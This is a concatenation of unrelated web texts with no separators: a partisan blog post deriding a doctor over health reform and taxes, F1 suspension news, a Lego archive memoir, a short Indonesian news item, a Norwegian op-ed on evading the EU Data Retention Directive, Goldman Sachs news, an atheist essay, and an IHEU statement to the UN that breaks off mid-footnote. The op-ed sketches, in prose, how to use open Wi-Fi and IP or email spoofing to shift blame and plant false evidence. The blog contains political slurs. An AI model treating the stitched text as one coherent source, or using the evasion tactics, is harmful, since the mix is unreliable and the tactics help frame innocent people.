" And most analysts think reimbursement rates for docs will go down about 20 - 25 % the next 2 years , and that is BEFORE Obamacare really kicks in . "
( h/t Mugsy )
Before I go sideways ballistic on this guy , I 'll try and sort out fact from fiction , just a bit .
Reimbursement Rates for doctors
Reimbursement rates for doctors are part of the famous " docfix " package that Sen.
Tom Coburn ( R - OK ) is holding hostage along with an extension on unemployment benefits .
The House passed the docfix last year , but the Senate is a bit slower on the uptake , largely due to the political obstructions placed on the pathway by the likes of Senator Coburn and his cohorts .
From the name " dermdoc " , it can be inferred he is a specialist , probably a dermatologist .
Specialists are a bit piqued about the health reform bill because it allows for a bonus to primary care providers , to encourage incentives for more to either return to or enter the field .
As insurance companies took over more health management authority , it was far more lucrative for doctors to skip primary care entirely and jump into a specialty .
Medicare and insurance reimbursement rates have always been far in excess of what they pay primary care physicians .
There are two consequences to this .
First , the number of primary care physicians dropped drastically ; and second , health care costs careened out of control as specialists tended to order state - of - the - art testing and treatments .
One of the centerpieces of the health care reform bill is to put primary care providers back in the center of the health care picture .
This is good for us and it's good for reducing costs , because most conditions do n't require a specialist , and having a primary doctor who knows you , your family , and your specific circumstances means there 's a history they can draw upon to make decisions about treatments .
This does n't mean specialists are n't necessary .
They are , but not always as a first - line option .
Consequently , specialists are a bit annoyed at the prospect of losing their monopoly over different parts of your body to a more holistic approach .
Beyond that , is n't it time that doctors considered the cost - saving measures in the law ?
After all , streamlining claims procedures , Medicare codes , implementing electronic health records , and standardizing it all is also part of " Obamacare " .
Does n't it make sense that if they save money on these aspects of providing care , it will flow through to them ?
dermdoc 's real issue : The Bush tax cuts expire
12/31/2010
Make no mistake .
When the Bush tax cuts expire , there will be screams from many different corners of the country .
All the high rollers will ( gasp ! ) have to pay a reasonable income tax for the privilege of keeping 75 cents on every dollar or so .
Pardon me if I do n't bend over weeping for those earning in excess of $ 300,000 when they have to pay extra taxes .
That Medicare tax increase for " Obamacare " ?
An extra $ 900 or so .
Big Frickin' Deal .
And check this comment on the same thread :
But race did n't have anything to do with this doctor 's feelings toward Obama , his employee , or the health care bill , did it ?
None whatsoever .
Sure thing .
My personal message to whining doctors
Get over yourselves .
It 's law , it 's staying law , and you 're going to make a boatload of money one way or the other so you can fund your racist conservative teabagging buddies in the Southern states .
If it 's so repugnant to you to practice medicine for the welfare of patients instead of the welfare of your checkbook , get out of the medical profession , get out of the way , and let someone who gives a damn step in your place .
And pass your 35 % tax credit for insuring those employees over this way , would you ?
The most absurd part of this doctor 's rant is that he either does n't give his employees health insurance , in which case he 's part of the problem , or he does .
If he does , and his practice has less than 25 employees he 's entitled to a 35 % tax credit on what he pays to cover them .
A dollar - for - dollar tax reduction on cost of benefits for employees that he did n't have last year .
In the end , all politics is local , and what dermdoc did was retaliate out of political pique at an employee who now will drive his tax bill up by claiming unemployment benefits .
Good job there , dermdoc .
Mighty compassionate of you , but not very fiscally responsible .
UPDATE ( Nicole ) : Apparently unused to the wild and wooly world of the blogosphere and the unvarnished criticisms that go with it , " dermdoc " has denied any layoffs and slams the media for not doing any actually confirming before running the story ( h/t Scott ) :
there was no layoff of anyone at my office .
Any of you reddit dweebs can check my employment records or call my office on Monday .
IT WAS ALL A TROLL !
I was merely making a hypothetical because of frustration with decreased reimbursements and future increased taxes .
It is really hard to believe that simply by posting a topic on the internet that I could make newspapers , several national talk radio talk shows - WITHOUT ANY VERIFICATION .
Whatever .
What has the US become when you have entire web sites of people sitting around just waiting to screw with people and their families without even checking out the source .
Granted , all of this is my fault but any " Ag " who would screw with other Ags or this website because of one unverified post needs to seriously check out their life .
All you lefties can call off the preemptive strikes on me or my family , my wife actually was the one who made me do this because she feared for our safety .
I am done .
Guess dermdoc should consider himself lucky that his story was n't one that Drudge , Malkin or Breitbart would have a problem with .
If he thought lefties were harsh on him , can you imagine what those readers would have said ?
McLaren has shelved plans to introduce a self - adjusting suspension system at the Chinese Grand Prix , after the FIA 's clarification on the issue in Malaysia made it clear that such developments are illegal .
Rumours in the paddock suggested Red Bull was running suspension that was adjusting the ride - height between qualifying and the race , when such alterations are banned , to gain optimum downforce .
The team denied the speculation and on Sunday in Malaysia the FIA clarified that any alterations are strictly forbidden unless the team is willing to start the race from the pit lane .
Before the clarification McLaren had been working on a system , but during the Vodafone McLaren Mercedes Phone - In , engineering director Paddy Lowe confirmed the team was no longer planning to use it .
" We became aware of different way of interpreting it [ the rules regarding suspension ] , which we had n't historically thought to be the normal interpretation , and we were reacting to that , " Lowe said .
" Now that the FIA has taken a fresh view of it and drawn a line - that we think is closer to the historical line - we 're reacting to that too and we 've had to change some of the things we were doing .
" We got the feeling we were rather late to the game .
But we absolutely do n't know who 's been doing what and whether indeed anyone has been racing anything in the nature of ride height - control systems .
We had things we were working on but they have now been suspended . "
Lowe added that teams were still allowed to adjust the ride height during pit stops as long as they did not adjust the car on the grid before the race .
" There is what you can do to the car between qualifying and the race and there 's what you can do during the race , " he said .
" In parc ferme , there 's quite a clear ruling that says any adjustment to the suspension would require you to start from the pit lane .
This was originally intended to stop people changing springs , ride heights and that sort of thing .
" This has got a bit tricky because you can design suspensions that self adjust during that period and there are all sorts of physical techniques you could use to do that .
If you can imagine a suspension that without any human intervention it changes its set - up then I think there is a perspective that would say I have n't touched it so it 's no different .
" I think what the FIA have now clarified that I think makes things very plain and straightforward is that if even if you do n't touch it , if effectively you 've programmed it to change then you 've effectively made a change in set - up .
" What you can do during the race has also been clarified by the FIA .
There are systems that can be relaxed which control ride height during a race , a bit like active suspension , but without using external power .
Such systems were captured going back to 1993 by that same interpretation - they are no different to active suspension , even if they do n't use external power .
" During a pit stop you can adjust the ride height but you could n't adjust it on the grid . "
He also said that McLaren were still expecting to be competitive in China due to a set of planned updates unrelated to the car 's suspension .
" We made some improvements for Malaysia and we 've got some more for China , which are all aerodynamic and [ should be worth ] several tenths , " he said .
Nothing brings up memories as smells do .
In my case , it 's the smell of plastic .
Thousands of little colorful plastic pieces in cardboard boxes .
Literally , all those memories live in a secure , temperature - and humidity - controlled , fireproof archival vault in Denmark .

This is the story of my trip to that vault —
The Memory Lane , as Lego appropriately calls it — back in June 2008 .
Advertisement
Visiting the Lego's Memory Lane — the secret vault guarding almost every Lego set ever manufactured — touched me in a way I did n't expect .
This was n't amazement or simple awe .
I was already astonished to no end by the tour of the Lego factory .
No , this was something else , something bigger than the impressive view of the 4,720 Lego sets inside this lair .
These were n't just simple boxes full of bricks .
These were tickets to ride a time portal to emotions and simpler days long forgotten .
Best LEGO
Sets in History
To end the celebration of the 50 years of the LEGO brick , here are the best sets in history . …

I did n't know that when I was curiously ogling the oldest sets , from the 1950s .
Jette Orduna - the curator for the Idea House , Lego 's history museum set in the old family house of the owner , Kjeld Kirk Kristiansen - was explaining the first Lego sets , obviously enjoying my enthusiasm .
" Here 's the wooden box that some shops around Denmark had , usually hairdressers or general stores " she would say while carefully opening it for me to see its contents , simple red and white bricks without tubes , some of them with windows on them , " they contained individual Lego bricks .
Back then , parents bought them regularly to their children , so they could keep expanding their Lego system . "
Then she would turn her attention to another set , as I kept asking what was this or that .
" Yes , it 's called ' electronic ' because this train could be activated by whistling , " she would explain , whistling herself .

I was just enjoying it like an archeologist .
Her explanations , the cool box designs , the quick evolution of the first years ...
I was amazed by the ingenuity of it all , curious about the origins of the myth .
But that was it .
Just simple curiosity .
Until we got to the 1970s .

Knowing my previous comments , Jette went straight to one of the shelves , at the end of the long aisle .
She looked up and down , her lips pressed together , concentrated in finding something .
While she was doing this I was filming around , eyes wide open , thinking " oh , is that ? " and " nah , that ca n't be ... can it ? " my excitement growing by the second .
It was then when she took out a large rectangular box with yellow sides , saying " a- ha !
Here it is . "
I turned around and I saw what she had in her hands : the Lego Space Galaxy Explorer .

And then it hit me .
Lift off .
Godspeed .
Boom .
A wave of emotions took control , hitting my head like a Lego Airbus 380 .
Dozens of images started to appear in my head , Polaroids of Xmas and birthdays that I thought were faded , completely fresh , color - corrected , and restored by the damn Lucasfilm for a Blu-ray re-release .
I could even see the Hollywood quote whores saying " Better than ever ! " , " The past never looked so good ! " , and " Five stars ! " embossed in silver on the special edition boxed set .
There was my mother and father - who built a huge Lego ferris wheel and the Blue Train for us when we were too young to build it , then never stop giving us new sets every year - and then my two brothers and my sister , playing on the rug , building all kind of new and wonderful constructions populated by the strangest creatures .
And that smell .
The perfect smell of Lego bricks .
Advertisement
You know what I 'm talking about , those were the days and all that jazz .
But for real .
Feelings and moments from times when everything was innocent and your only concern was your bike , a big carpet full of Lego bricks , and the amount of cocoa in your cereals .
Advertisement
After that , it was one wave after the other , jumping from Lego Space to Lego Technic to Lego Town to Lego Castle and Lego Pirates and Lego Star Wars .
Each set a memory , a particular Kodak moment blurred by the occasional teary eye .
Advertisement
Soon , too soon , it was over .
And as I was walking up the stairs , back to the present , slowly letting the past fade back into the treasure chest , I thought : " This must be it .
This must be reason why Lego is so loved by almost everyone in the planet . "
Sure they are fun .
The details , the incredible designs , the way you physically touch them , how they make you use both your hands , creativity , and logic .
All that is there , all are parts of their universal appeal .
But there 's a lot more .
Something more fundamental , bigger than the sum of all those qualities .
Underneath all that there 's a primal connection , something that makes everyone tune into the childhoods when they see the bricks , and get back into brighter , careless moments , even at the subconscious levels .

And thinking that , I joined Jette and Jan in the Real World , with a grin on my face .
I could n't think of a better song to go with this story than the Johnny Cash version of Memories Are Made of This , from the album Unchained .
Sadness and happiness at the same time , bringing so many other memories on its own .
You can buy it at Amazon or the iTunes Music Store .
In fact , get the whole album while you are it , because it 's amazing ( and so are the rest of the American Recordings series ) .

An Indonesian teenager chopped off his penis and tossed it down a well after learning his girlfriend intended to marry another man .
The 19 - year - old from a village in Central Java was lucky to survive the self surgery , health authorities said .
" He arrived at the hospital last Thursday in critical condition from blood loss , " Cilacap General Hospital Director Sugeng Budi Susanto told local media .
" Cutting off a penis can be fatal . "
Doctors were unable to reattach the dismembered member because villagers could not find it .
Den siste tiden har EU - direktiv DIRECTIVE 2006/24 / EC , best kjent som Datalagringsdirektivet ( DLD ) , vært debattert både i media , på internett og i politikken .
Debatten har i hovedsak dreid seg om de prinsipielle og ideelle problemstillingene relatert til personvernet .
Noen mener DLD vil føre til en uakseptabel svekkelse av personvernet , mens andre mener svekkelsen veies opp av fordelene politiet vil få i bekjempelse av terrorvirksomhet og alvorlig kriminalitet .
Man kan være enig eller uenig i de ideelle og prinsipielle argumentene omkring innføringen av DLD .
Imidlertid er det et uomtvistelig faktum at det er enkelt å omgå overvåkingen DLD medfører .
I beste fall sitter man igjen med en enorm mengde ubrukelige data om uskyldige personer .
I verste fall sitter man igjen med plantede , villedende og falske bevis .
I denne kronikken belyser jeg hva DLD er og beskriver hvordan du omgår det .
For den som vil lese mer om de prinsipielle og ideelle problemstillingene rundt innføringen av DLD anbefaler jeg boken
Til forsvar for personvernet ( Clemet , Egeland [ red ] et al ) .
Hva er DLD ?
DLD ble vedtatt av EU 15 .
mars 2006 og pålegger medlemslandene å lagre trafikk - og geodata fra innbyggernes bruk av telefon , mobiltelefon , bredbåndstelefon , e-post og internett .
Det vil si informasjon om hvem som kommuniserer med hvem , hvor kommunikasjonen finner sted , samt når og hvordan det kommuniseres .
Formålet er å gi politi- og påtalemyndighet et verktøy for å bekjempe det medlemslandene selv definerer som « alvorlig kriminalitet » , opprinnelig definert som terrorvirksomhet .
Hvert land kan selv avgjøre hvem som skal ha tilgang til de innsamlede dataene og hvor lenge dataene skal lagres , minimum 6 og maksimum 24 måneder .
Det kan være vanskelig å sette seg inn i hva dette betyr for for den enkelte .
Dersom DLDs betemmelser hadde funnet sted med fortidens teknologi ville den vært enklere å forstå .
Man kan forestille seg en kontrollør ved telefonen som noterte hvem du ringte til , når du ringte og hvor lenge samtalen varte .
Eller en kontrollør ved postkassen som noterte hvem du sendte brev til og hvor brevet ble postet .
I prinsippet vil det samme foregå med DLD .
Forskjellen er at det vil skje med moderne teknologi som er usynlig .
Debatten omkring DLD er prinsipielt svært viktig .
Våre politikere må ikke ta standpunkt før de forstår alle aspekter av en problemstilling som vil få store konsekvenser for personvernets fremtid .
Slik omgår du DLD
Det er mulig å omgå overvåkingen , også for de uten nevneverdig teknisk kompetanse .
Her omtaler jeg fem eksempler på hvordan :
Proxy
Proxy betyr stedfortreder .
En proxy - tjener er en internettbasert tjeneste hvor den som bruker tjenesten kan kommunisere med andre deler av internett via denne tjenesten .
DLD vil således kun lagre informasjon om kommunikasjon mellom meg og proxy - tjenesten , ikke hvem jeg kommuniserer med mellom proxy - tjenesten og videre .
Anonymiseringstjenester
Det finnes flere anonymiseringstjenester på internett som fungerer som lukkede nettverk hvor brukere kan kommunisere med andre mennesker uten å bli overvåket .
Blant de mest kjente anonymiseringstjenestene finner man Tor ( The Onion Router ) , I2P ( Invisible Internet Project ) og Dold.se .
Usikre trådløse nettverk
De aller fleste benytter i dag trådløse nettverk .
For å sikres mot misbruk må trådløse nettverk sikres med passord og kryptering .
Imidlertid vet vi at det finnes åpne , usikrede nettverk praktisk talt overalt .
Dette er nettverk hvor hvem som helst , innenfor rekkevidden av nettverket , kan koble seg til og få tilgang til internett .
Man kan da begå lovbrudd via det usikrede nettverket , mens det er eieren av nettverket som vil bli overvåket med DLD , og således bli dømt for misbruk .
Eksempelvis kan man i
Oslo reise opp til Holmenkollen og koble seg til det trådløse nettverket som på stadion også er åpent for publikum .
IP spoofing
En mer sofistikert teknikk er kjent ved navnet IP spoofing .
Ved hjelp av denne teknikken kan man forfalske såkalte IP - adresser .
Med denne teknikken kan man således plante falske beviser .
Forfalsking av e-postadresse
Å forfalske en e-postadresse er svært enkelt .
I kombinasjon med ovennevnte teknikker er det svært enkelt for en kyndig person å utgi seg for å være en annen , og således plante falske bevis eller å forlede overvåkingen .
Teknikkene satt i system
Ved å kombinere de ovennevnte teknikkene er det enkelt å omgå DLD .
Selv vil jeg — dersom DLD innføres i Norge — sette opp min egen , private proxy - tjener i et land som ikke omfattes av DLD .
På denne tjeneren vil jeg opprette en anonymiseringstjeneste som kun jeg og min husstand har tilgang til .
Deretter vil jeg opprette en kryptert forbindelse mellom mitt hjem og denne tjeneren , slik at all kommunikasjon mellom hjemmet og resten av nettet skjer på en sikker forbindelse som ikke kan overvåkes og loggføres med DLD .
Dette er lovlig og jeg vil gjøre det fordi jeg ikke liker at alle mine aktiviteter blir overvåket .
De kriminelle omgår DLD
Konsekvensen av de ovennevnte punktene er at de man faktisk ønsker å overvåke med DLD ikke omfattes av overvåkingen .
Man vil således sitte igjen med en enorm mengde ubrukelige data som i sin tur kan misbrukes hvis den havner i feil hender .
Når de man ønsker å overvåke omgår overvåkingen , bør ikke overvåkingen finne sted .
Anslag fra den tyske Bundeskriminalamt anslår at DLD kun vil øke oppklaringsprosenten i kriminalsaker fra 55 % til 55,006 % .
Også EuroCOP , hvor Politiets Fellesforbund er medlem , påpeker at « The result would be that a vast effort is made with little more effect on criminals and terrorists than to slightly irritate them » .
Det kan vi ikke la være prisen for personvernet .
I de landene hvor DLD allerede er innført kan heller ikke EU vise til saker der alvorlig kriminalitet eller terror har blitt avverget .
Intensjonen med DLD er god , men med tanke på hvordan privatlivet innskrenkes og at det er en teknisk trivialitet å omgå direktivet , må Norge benytte sin reservasjonsrett til å si nei til innføringen av det .

Goldman Sachs may soon settle its fraud case with the Securities and Exchange Commission , opting to end the legal fight rather than endure a repeat of the public flogging it received Tuesday in Washington , sources familiar with the matter told The Post .
After 11 hours of accusations by members of the Senate Subcommittee on Permanent Investigations , people close to the bank said Goldman is mulling closing the SEC fraud - case chapter on the belief the firm ’s reputation , already damaged , might not endure a street fight with the Wall Street watchdog .
“ It ’s almost a certainty that there will be a settlement , ” said a source .
As another person put it , the SEC has an “ unlimited supply of ammunition ” in the form of e-mails and records that it could release , and Goldman officials would like to avoid having those documents fired back at them the way they were on Tuesday .
A Goldman spokesman declined to comment .
The SEC on April 16 announced that it had sued the Wall Street giant on charges it misled investors about the details of a mortgage - securities deal in which billionaire hedge fund king John Paulson influenced some of the collateral used in the transaction and then bet against its performance .
The SEC also sued Goldman mortgage trader Fabrice Tourre , who ’s been accused of concealing Paulson ’s involvement when marketing the deal to investors .
Up to now , Goldman , which has endured a withering fusillade of criticism from the public and politicians , has declared that the SEC ’s case against it and Tourre has “ no basis in fact . ”
However , the growing view inside the firm is that Goldman may not be able to afford going toe - to - toe with the SEC in the court of public opinion if the civil case were to head to trial .
Indeed , the bank and how it does business was on full display Tuesday as senators took turns beating up on current and former employees over their alleged roles in the housing crisis , citing a slew of e-mails aimed at portraying the firm as unethical .
The SEC filed its charges after months of discussions with the bank over the claims .
However , sources said the agency pulled the trigger on suing the bank out of frustration for what it saw as Goldman dragging its feet toward a resolution .
One source refuted the notion that Goldman had a chance to settle the claims before the SEC sued , adding the agency “ took the unprecedented step of filing its lawsuit against a public company in the middle of the morning while the stock was still trading .
“ So , the idea that [ the firm ] should have settled this months ago bears no resemblance to reality .
[ The firm ] was never given the chance , ” the source said .
Meanwhile , according to reports late yesterday , Goldman is in talks over a possible settlement involving a hedge fund investor that claims it went bust after it took a $ 100 million investment in Timberwolf , an overnight sensation for being dubbed by a senior Goldman exec as a “ shi- -y deal . ”
Basis Yield Alpha Fund claims losses of $ 56 million , reports said , citing sources .

WASHINGTON ( MarketWatch ) --
The Federal Reserve has ended its probe of Goldman Sachs contracts with the Greek government that distort the country 's debt levels , without taking any action , said Federal Reserve Board chairman Ben Bernanke on Wednesday .
In testimony to Congress , Bernanke said Goldman Sachs GS , +2.12 % in 2000 and 2001 did sell Greece products that lowered the country 's debt - to - GDP ratio .
This transaction happened before the Enron crisis when rules against accounting related transactions were set up , Bernanke said .
" We believe that that situation is well under control , " Bernanke said .
Goldman now has procedures in place to make sure trades are not motivated by accounting , he noted .
On a broader issue , U.S. banks exposure to European sovereign debt , either directly or through credit default swaps , is relatively limited , Bernanke said .
During a trial at The Old Bailey in February 2010 , a man was given no jail sentence for deliberately breaking a stranger ’s jaw in an unprovoked attack .
He was let off with community service and a fine .
The judge reasoned that the accused merited no harsher punishment because he was religious , and therefore unlikely to reoffend .
The decision highlights the bizarre , yet persisting , assumption that religious faith is somehow an indication of good character – that there is something intrinsically and self evidentially good about being religious .
Society supposes to believe in the morality of religion due to its moral teachings and the charity done by religious groups .
However , if you do think religious people are moral , you must ask yourself why they are moral .
Is it plausible that their morality comes from the teachings of the holy books and from a belief in heaven and fiery hell ?
The holy books of the monotheisms were written when humans had no understanding of bacteria , tectonic activity or electricity ; when they believed the earth was a disk , and the sky a dome .
Is anyone seriously suggesting that without these we would n’t know right from wrong ?
If the Jewish ancestors were not at the foot of Mount Sinai would we not understand that it is wrong to murder ?
If God were proven not to exist would we all immediately embark on lives of theft , murder and cruelty ?
Virtuous behaviour by a believer , or on behalf of a religious organisation is not proof of the moral steadfastness of religion .
It is not even argument in its favour .
People of religious charity did not originally lead self - centered and selfish lives until instructed by scripture to donate their money and free time to others .
Such an argument goes nowhere in explaining the good actions done without supernatural consideration or inducement .
With the claim that religion is inseparable from ethics and morality they are conceding that if it were not for faith , they would lead a lives of unbridled immorality .
Is it ethical to be good only because you fear punishment ?
A person who led a good life only because they feared hell would go straight to hell .
Morality is part of human nature .
It is also in the nature of a large number of animal species that do n’t claim to be divinely inspired .
If you see a child trying to run into a stream of traffic , something tells you what you ought to be doing about it .
Equally , if you think of the worst thing you have ever done , the action of which you are least proud , and that you would least like to have widely known about , it undoubtedly pales in comparison to the actions of Dr Harold Shipman .
Dr Shipman took great pleasure in murdering people who trusted him .
Although you are ashamed of what you did , you think : “ Yeah , but I ’d never do that , I would n’t , and no one needs to tell me why I would n’t ’ . ”
Morality is effortless , it ’s innate , and does n’t need to be taught to children .
Even an 18 - month year old child will try to comfort someone they see in distress .
The argument is brilliantly summed up by Christopher Hitchens : “ name me an ethical statement made , or an action taken by a believer that could not have been performed by a non believer .
As yet I have heard of none .
However , if you ask an audience to name a wicked action directly attributable to religious faith , nobody has any difficulty in finding an example ” .
In spite of the current pessimistic view of the declining morality of society , the historical trend is of a positive improvement in society ’s moral outlook .
Today ’s views on race , gender , equality , war , torture and sexual orientation are wildly different from the widespread views of society at the beginning of the 20th Century , and even from the views of the 1950s .
Mainstream views on all these topics have only improved .
The standard of morality in society improves decade on decade , and it is only based on our own ethical intuitions , and on conversation with the ethical intuitions of others .
The moral standard has advanced so far that even the actions of Hitler , widely regarded today as pushing the envelope of evil into unchartered territory , would not have even been noteworthy in the time of Genghis Khan .
In accordance with this shifting morality , people of faith choose to reject the holy pearls of wisdom that encourage death by stoning for , among other things , adultery , premarital sex , atheism , belief in another God and homosexuality .
These teachings are in the holy texts not as metaphors or analogies but as explicit instructions .
The monotheistic texts celebrate war , murder , and genocide .
Even good old Jesus was clearly a fan of slavery .
Religious believers instead choose to emphasise the teachings similar to the golden rule – to behave to others as you wish them to behave towards you .
The golden rule is not unique to any religion or society past or present , in fact , almost every society in the history of the world had a version of this rule in its cultural teachings .
A large number of believers go through the holy texts picking out the nasty verses from the nice verses ; they choose the teachings that conform to current secular , moral standards .
Religion gets its morality from society , not the other way around .
The social standard to which religion conforms is available to everyone , and it advances in parallel in everyone .
The places in which the moral standard has not advanced are typically the places in which religion looms large .
Equally , the most successful , prosperous and democratic countries are those in which state and religion are separated by law ( the only legal exception is the United Kingdom , however , the UK plainly functions as a secular republic ) .
A common riposte by the faithful is that the 20th Century was the most secular period in human history , and produced such monsters as Hitler and Stalin .
If we ’re on the subject of dictators , however , Mussolini , Franco and Salazar were installed and maintained by the Catholic right wing .
Hitler was a Catholic , and the Catholic Church said prayers to celebrate Hitler ’s birthday until as late as April 1945 .
Stalin was also able to exploit the apparatus of subservience adroitly created by the Russian Orthodox Church .
In response to this argument , it is only necessary to highlight the decision of the Pope in 2005 to announce that condom use could worsen the problem of HIV and AIDS in Africa .
It is difficult to imagine how the Pope could have caused more misery and human suffering with fewer words .
Equally the advance of stem cell research is held back due to the religious theory of ‘ souls ’ , a theory , which is shown to be spurious by a short spurt of the most basic scientific analysis .
In any case , is the ‘ soul ’ of a cluster of cells more important than the life of a six - year - old child with cerebral palsy ?
The religious bludgeonings in the Middle East are almost too obvious to mention .
It must be noted , however , that the actions committed there are not done “ in the name of religion ” , which is a common get - out clause of the faithful , but under the direct instruction of Imams and Rabbis .
The easiest response to this claim of the deficiency of secular morality is that there are no atheist suicide bombers .
The idea that religion , ethics and morality are intrinsically linked is promulgated alongside the taboo of criticising religion .
Throughout human history no one has been able to provide any type of evidence for a supernatural being , in fact only an abundance of evidence to the contrary .
However , it remains that people ’s faith cannot be questioned because ‘ it ’s their religion ’ .
Although it is not understood where human morality comes from , it certainly does not come from religious texts .
Richard Dawkins describes a convincing evolutionary theory in The God Delusion .
Stephen Fry , however , concludes the argument most eloquently : “ we should never allow religion the trick of claiming that the altruistic , the morally strong , and the virtuous are in any way inventions of religion , or particular or peculiar to religion ” .
An argument that claims morality stems from religion would be equally as convincing as an argument for an all loving , all powerful God who kills tens of thousands of people every year in natural disasters , who only chose to reveal himself after 100,000 years of human existence , whose only method of getting his son to earth was to impregnate a Palestinian virgin , and then to have all subsequent revelations in the same district .
The UN Human Rights Council today published a written statement by IHEU on the role of the Holy See in the child abuse scandals that rocked the Catholic Church in recent years , and its failure to honour its obligations under the UN Convention on the Rights of the Child .
Commenting on the report , Roy Brown , IHEU Main Representative at the UN Geneva said : “ The Holy See has been heavily implicated for decades in covering up cases of child abuse carried our by its clergy and religious orders , in obstructing justice , and in failing to deal appropriately with abusers .
Yet for too long it has been given a free ride by the international community because of its presumed moral leadership .
Our report is the first to bring the issue to the attention of the Council .
We shall be referring to our report in the plenary of the Human Rights Council next week . ”

Agenda item 4
HUMAN RIGHTS SITUATIONS THAT REQUIRE THE COUNCIL’S ATTENTION Written statement * submitted by the International Humanist and Ethical Union ( IHEU ) , a non-governmental organization in special consultative status
The Secretary - General has received the following written statement which is circulated in accordance with Economic and Social Council resolution 1996 / 31 .
[ 28 August 2009 ]
This written statement is issued , unedited , in the language (s ) received from the submitting non- governmental organization (s ) .

A/HRC/12/NGO/25
Child Abuse and the Holy See
Background
1 . In 1990 the Holy See acceded to the UN Convention on the Rights of the Child ( CRC ) , agreeing to take a number of initiatives to protect children1 .
However , its accession was made subject to several important reservations based on its status as a church which crucially undermined its accountability – even though it was acceding as a state2 .
In 1994 the Holy See submitted its initial report to the CRC , about which the CRC expressed five areas of concern3 including , crucially :
“ 10 .
In the spirit of the final document of the World Conference on Human Rights , the Committee wishes to encourage the State party to consider reviewing its reservations to the Convention with a view to withdrawing them . ”
4
Extent and effects of the abuse
2 . The Church is faced with huge numbers of victims of child abuse worldwide5 extending over decades .
In the USA alone , nearly US$ 3 billion has been paid out in compensation .
Even in Ireland with a population of only 5 million , more than Euros 1 billion has been paid out ( of which only 10 % has been borne by the Church ) .
6
3 . Evidence submitted to the UN in 2003 sets out typical consequences in later life for abused children7 : Post Traumatic Stress Disorder , vulnerability to further re-victimisation , difficulties with interpersonal relationships , materially increased risk of self - harm or suicide8 , aggravated by persistent denials of responsibility by Church authorities , as discussed below .
The Church ’s reaction to the scandal
5 . Several characteristics typify the cases that have reached the public domain .
i . Victims have been accused of lying , even in the face of strong evidence to the contrary .
( “ One must not give scandal to the church ” is ingrained in every priest . )
ii
In most cases , sometimes over many years , local dioceses have failed to inform the civil authorities and have covered up allegations , whether or not they believe their instructions from the Holy See require this .
Moreover , dioceses have moved alleged abusers from one location to another , resulting in repetition of the abuse9 .
iii .
Although many clerics from all levels have resigned , mostly involuntarily , others have tried to face it out .
One who had papal support was Bernard Law , Archbishop of Boston10 , who was forced to resign when he was proved to have systematically covered up abuse in 2002 .
He still enjoys papal support as archpriest of a papal basilica in Rome and he is still a cardinal .
iv .
The Church has frequently suggested that the problem was minor , has blamed other , unconnected factors , or claimed that it did not know the true extent of the problem .
It has also claimed that it was ignorant of the nature of child abusers or of their recidivist tendencies known by the church since at least the 1960s .
11 Apologies are rare ; a general admission of the Church ’s culpability has yet to be seen .
v. Every possible step has been taken by the Church to minimise both criminal sanctions and the amount of compensation it paid to victims .
“ Gagging ” clauses are routinely imposed as part of settlements of cases12 .
Factors contributing to concealment
6 . The most prevalent common characteristic of the thousands of cases of child abuse that have come to light is secrecy at every level , whether “ bought ” as part of a settlement13 , of one priest reporting another14 , or – as in Ireland – shameless and widely - publicised attempts made by religious institutions , apparently without censure and possibly with support from highest authorities in the Church15 , to obstruct the publication of reports about wholesale abuse .
16
Apparent contraventions of UNCRC
7 . The relevant articles are :
Article 3 : ( In all actions concerning children . . . the best interests of the child shall be a primary consideration . )
Article 19 : 1 . ( protect the child , … including sexual abuse … effective procedures for the establishment of . . . forms of prevention and for identification , reporting , referral , investigation , treatment and follow - up of instances of child maltreatment described heretofore , and , as appropriate , for judicial involvement . )
Article 34 : ( States Parties undertake to protect the child from all forms of … sexual abuse . )
Article 44 ( 1 ) ( Reporting )
Article 44 ( 2 ) ( Reporting difficulties … affecting … fulfilment of … obligations under the … Convention . )
8 . The Holy See , alone among the founding signatories , contravenes article 44 ( 1 ) of the CDC by submitting no quinquennial reports .
This omission has only been remarked upon , as far as we are aware , in the Catholics for Choice Shadow Report ( op.cit . ) and by the Irish charity One in Four17 .
The CRC publishes agreements for late submissions for State Parties , but none are recorded for the Holy See18 suggesting that no commitments have been made to make amends .
9 . The CRC requested the Holy See to withdraw all its reservations to the Convention , including the exclusion of the Vatican City ( the only geographical territory under the jurisdiction of the Holy See ) from its agreement under reservation ( c ) 19 , but it has failed to do so .
The Holy See cannot escape its responsibility in cases of child abuse by priests elsewhere , given its claim to be “ the highest organ of government of the Catholic Church ” , and that it does not seek any reservation from the Convention in this respect20 .
10 . The Holy See ’s initial report , submitted in 1994 , referred to child abuse only in the context of the family , although the Pope21 told US bishops in 1992 :
“ You are faced with two levels of responsibility : in relation to the clerics through whom scandal [ of clergy sexual abuse of children ] comes and their innocent victims , but also in relation to the whole of society systematically threatened by the scandal . . . .
A great effort is needed . . . ”
The Holy See is therefore in breach of Article 44 ( 2 ) of the CRC in its failure to report these cases .
The Holy See ’s dual status
12 . The Holy See is recognised at the UN as a state through its geographical base in the Vatican City .
It sends out ambassadors and makes treaties ( “ concordats ” ) with foreign powers 22 .
At the same time it claims a need to exercise its mission in full freedom , and to be able to deal with any interlocutor , whether a government or an international organization .
23
13 . Because of the Church ’s long history and influence , UN institutions have failed to subject such claims to critical examination , so much so that the Holy See has been allowed to escape the same level of scrutiny under the CRC as is applied to other State Parties .
Conclusion and Recommendations
14 . The Holy See has been complicit in widespread attempts to cover up cases of alleged child abuse perpetrated by members of its clergy .
15 .
We urge the Holy See to recognise its responsibilities and honour its commitments to the CRC and to instruct all dioceses to report all cases of alleged child abuse to civil authorities , at least where required to do so by law .
As an institution which claims to have “ the highest moral authority ” , it can do no less .
16 .
We would recommend that the UNCRC committee formally request the Holy See to :
1. Clear the backlog of its reports to the UNCRC and state that these should specifically include full compliance with Article 44 ( 2 ) , without reservation by the Holy See – that is , full disclose of child abuse cases ;
2 . Open up to UNCRC workers and others working in child welfare all its archives in Vatican City State and in States parties concerning any matters relating to known or suspected child abuse ;
3 . Make available for interview officials with any knowledge of these matters ;
4. Issue instructions overriding all others , including in Canon Law , that all Church officials are required to communicate knowledge or suspicions of child abuse to UNCRC officials , and to civil authorities under local laws , which have become known to the Holy See since it became a signatory of the Convention .
17 .
We also urge the UNCRC to use its powers to investigate , or invite other UN agencies to investigate , the Holy See ’s non-compliance with the CRC in respect of child abuse by its personnel , its failure to report such abuse to CRC , the conduct of cases submitted to CDF , its reservations on accession to the treaty , the role of internal regulations including Canon Law in impeding child protection , and the role of insurance contracts in possible breaches of the
Convention .
These investigations should be completed and publicly reported within five years .

19 “ D. Suggestions and recommendations
“ 10 .
